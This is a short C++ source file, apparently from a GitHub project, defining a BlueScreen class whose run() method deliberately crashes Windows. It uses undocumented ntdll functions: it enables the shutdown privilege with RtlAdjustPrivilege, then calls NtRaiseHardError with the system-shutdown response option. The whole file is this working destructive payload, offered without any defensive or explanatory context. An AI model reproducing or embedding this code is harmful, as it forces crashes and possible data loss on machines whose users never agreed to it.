#include "blueScreen.h"
#include <exception>

/**
 * @file blueScreen.h
 *
 * @author RussDev
 * GitHub: https://github.com/RussDev46
 *
 */

void BlueScreen::run() {

    HMODULE RtlLib = LoadLibraryA("ntdll.dll");
    if (RtlLib != nullptr) {
        BlueScreen::adjustPrivilege = reinterpret_cast<RtladjustPrivileg>(GetProcAddress(RtlLib, "RtlAdjustPrivilege"));
        BlueScreen::adjustPrivilege(19, TRUE, FALSE, &dumpy);
    }

    HMODULE NtRaiseLib = GetModuleHandleW(L"ntdll.dll");
    if (NtRaiseLib != nullptr) {
        BlueScreen::raiseHardError = reinterpret_cast<NtRaiseHardError>(GetProcAddress(NtRaiseLib, "NtRaiseHardError"));
        BlueScreen::raiseHardError(STATUS_FLOAT_DIVIDE_BY_ZERO, 0, 0, 0, 6, &dumpy2);
    }
    
}
